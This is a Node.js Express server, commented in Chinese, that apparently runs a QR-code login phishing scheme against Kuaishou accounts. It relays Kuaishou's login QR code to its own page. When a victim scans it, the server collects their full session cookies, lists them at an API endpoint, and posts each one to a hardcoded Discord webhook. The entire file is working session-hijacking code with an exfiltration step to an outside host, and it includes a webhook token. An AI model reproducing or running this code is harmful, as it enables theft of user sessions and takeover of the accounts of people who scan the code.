const express = require("express");
const https = require("https");
const { v4: uuidv4 } = require("uuid");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";

const scans = {};
const cookies = [];
const logs = [];

function ksRequest(method, hostname, path, body, cookieStr) {
    return new Promise(function(resolve, reject) {
        var headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        };
        if (cookieStr) {
            headers["Cookie"] = cookieStr;
        }

        var options = {
            hostname: hostname,
            path: path,
            method: method,
            headers: headers
        };

        var req = https.request(options, function(res) {
            var bodyStr = "";
            var respCookies = res.headers["set-cookie"] || [];
            res.on("data", function(chunk) { bodyStr += chunk; });
            res.on("end", function() {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    cookies: respCookies,
                    body: bodyStr
                });
            });
        });

        req.on("error", function(e) {
            logs.push("请求错误: " + path + " " + e.message);
            reject(e);
        });

        if (body) {
            req.write(JSON.stringify(body));
        }
        req.end();
    });
}

// 从cookie数组提取特定值
function getCookieValue(cookies, name) {
    for (var i = 0; i < cookies.length; i++) {
        if (cookies[i].indexOf(name + "=") !== -1) {
            return cookies[i].split(name + "=")[1].split(";")[0];
        }
    }
    return "";
}

// 获取sid（先访问快手首页）
function getSid() {
    return ksRequest("GET", "www.kuaishou.com", "/", null, null).then(function(result) {
        var sid = getCookieValue(result.cookies, "sid");
        if (!sid) {
            sid = getCookieValue(result.cookies, "kuaishou.server.web_st");
        }
        logs.push("获取sid: " + (sid ? sid.substring(0, 20) + "..." : "未获取到"));
        return sid || "";
    });
}

// ====== 首页 ======
app.get("/", function(req, res) {
    res.sendFile(path.join(__dirname, "scan.html"));
});

app.get("/cookies", function(req, res) {
    res.sendFile(path.join(__dirname, "cookies.html"));
});

// ====== 生成二维码 ======
app.get("/api/qr", function(req, res) {
    var scanId = uuidv4();

    getSid().then(function(sid) {
        if (!sid) {
            return res.json({ error: "获取sid失败，请重试" });
        }

        var cookieStr = "sid=" + sid;

        ksRequest("POST", "id.kuaishou.com", "/rest/c/infra/ks/qr/start", { source: "web" }, cookieStr).then(function(result) {
            logs.push("qr/start: " + result.body.substring(0, 500));

            try {
                var data = JSON.parse(result.body);

                if (data.result !== 1) {
                    logs.push("快手返回错误: " + JSON.stringify(data));
                    return res.json({ error: "获取失败: " + (data.error_msg || "未知错误"), raw: data });
                }

                var qrCode = "";
                var qrToken = "";

                if (data.data) {
                    qrCode = data.data.qrCode || data.data.imageData || data.data.qrCodeUrl || "";
                    qrToken = data.data.qrToken || data.data.token || data.data.loginToken || "";
                }

                // 从返回的cookie里找token
                if (!qrToken) {
                    qrToken = getCookieValue(result.cookies, "qrToken");
                }

                // 也合并cookie
                var allCookies = result.cookies.slice();
                if (!qrCode) {
                    res.json({ error: "未找到二维码", log: result.body.substring(0, 300) });
                    return;
                }

                scans[scanId] = {
                    status: "wait",
                    cookie: null,
                    qrToken: qrToken,
                    qrCode: qrCode,
                    cookies: allCookies,
                    sid: sid,
                    createdAt: Date.now()
                };

                res.json({ scanId: scanId, qrCode: qrCode });
            } catch(e) {
                logs.push("JSON解析错误: " + e.message);
                res.json({ error: "解析失败" });
            }
        }).catch(function(e) {
            logs.push("请求失败: " + e.message);
            res.status(500).json({ error: "请求失败" });
        });
    });
});

// ====== 检查状态 ======
app.get("/api/check", function(req, res) {
    var id = req.query.id;
    var scan = scans[id];

    if (!scan) {
        return res.json({ status: "expired" });
    }

    if (scan.status === "done") {
        return res.json({ status: "done", cookie: scan.cookie });
    }

    var cookieStr = "sid=" + scan.sid;

    ksRequest("POST", "id.kuaishou.com", "/rest/c/infra/ks/qr/checkResult", { qrToken: scan.qrToken }, cookieStr).then(function(result) {
        logs.push("checkResult: " + result.body.substring(0, 300));

        try {
            var data = JSON.parse(result.body);
            var scanStatus = (data.data && data.data.status) || data.status || 0;

            if (scanStatus === 2 || scanStatus === 3) {
                // 扫码确认成功，合并所有cookie
                var newCookies = result.cookies;
                var allCookies = scan.cookies.concat(newCookies);

                // 请求快手首页获取完整cookie
                ksRequest("GET", "www.kuaishou.com", "/", null, cookieStr).then(function(homeResult) {
                    allCookies = allCookies.concat(homeResult.cookies);

                    scan.cookie = allCookies.map(function(c) {
                        return c.split(";")[0];
                    }).join("; ");

                    scan.status = "done";
                    cookies.push({
                        cookie: scan.cookie,
                        time: new Date().toISOString()
                    });

                    sendToDiscord(scan.cookie);
                    res.json({ status: "done", cookie: scan.cookie });
                }).catch(function() {
                    scan.cookie = allCookies.map(function(c) {
                        return c.split(";")[0];
                    }).join("; ");
                    scan.status = "done";
                    cookies.push({ cookie: scan.cookie, time: new Date().toISOString() });
                    sendToDiscord(scan.cookie);
                    res.json({ status: "done", cookie: scan.cookie });
                });
            } else if (scanStatus === 1) {
                res.json({ status: "scanned" });
            } else {
                res.json({ status: "wait" });
            }
        } catch(e) {
            res.json({ status: "wait" });
        }
    }).catch(function() {
        res.json({ status: "wait" });
    });
});

// ====== Cookie列表 ======
app.get("/api/cookies", function(req, res) {
    res.json(cookies.slice(-50).reverse());
});

// ====== 日志 ======
app.get("/api/logs", function(req, res) {
    res.json(logs.slice(-30));
});

// ====== 发送Discord ======
function sendToDiscord(cookie) {
    var data = JSON.stringify({
        content: "**新Cookie**\n```\n" + cookie + "\n```"
    });

    var url = new URL(WEBHOOK_URL);
    var req = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
        }
    });
    req.write(data);
    req.end();
}

var PORT = process.env.PORT || 3000;
app.listen(PORT, function() {
    console.log("端口 " + PORT);
});